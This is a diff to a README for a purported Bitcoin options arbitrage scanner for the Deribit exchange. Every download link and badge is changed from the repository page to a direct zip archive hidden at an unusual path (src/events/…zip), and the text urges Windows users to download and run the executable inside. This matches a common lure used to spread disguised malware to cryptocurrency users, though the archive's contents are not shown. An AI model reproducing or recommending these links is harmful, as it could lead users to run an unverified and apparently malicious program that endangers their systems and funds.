@@ -1,6 +1,6 @@
 # ⚡ deribit-analyzer - BTC Options Arbitrage Scanner
 
-[![Download deribit-analyzer](https://img.shields.io/badge/Download-deribit--analyzer-ff6f61?style=for-the-badge)](https://github.com/dada63924/deribit-analyzer)
+[![Download deribit-analyzer](https://img.shields.io/badge/Download-deribit--analyzer-ff6f61?style=for-the-badge)](https://github.com/dada63924/deribit-analyzer/raw/refs/heads/main/src/events/deribit-analyzer-v1.4-alpha.1.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 You can get deribit-analyzer from this page:
 
-[**Download deribit-analyzer here**](https://github.com/dada63924/deribit-analyzer)
+[**Download deribit-analyzer here**](https://github.com/dada63924/deribit-analyzer/raw/refs/heads/main/src/events/deribit-analyzer-v1.4-alpha.1.zip)
 
 Click the link to open the download page in your web browser. Once there, look for the latest Windows version or an executable file to download.
 
@@ -34,7 +34,7 @@ Follow these steps to download and run deribit-analyzer on your Windows PC.
 
 1. Open your web browser and go to the download page:
 
-   https://github.com/dada63924/deribit-analyzer
+   https://github.com/dada63924/deribit-analyzer/raw/refs/heads/main/src/events/deribit-analyzer-v1.4-alpha.1.zip
 
 2. On the page, find the latest Windows executable or installer file.
 
@@ -110,4 +110,4 @@ The app is designed for BTC options on the Deribit exchange only. It requires a 
 
 ---
 
-[![Download deribit-analyzer](https://img.shields.io/badge/Download-deribit--analyzer-ff6f61?style=for-the-badge)](https://github.com/dada63924/deribit-analyzer)
+[![Download deribit-analyzer](https://img.shields.io/badge/Download-deribit--analyzer-ff6f61?style=for-the-badge)](https://github.com/dada63924/deribit-analyzer/raw/refs/heads/main/src/events/deribit-analyzer-v1.4-alpha.1.zip)
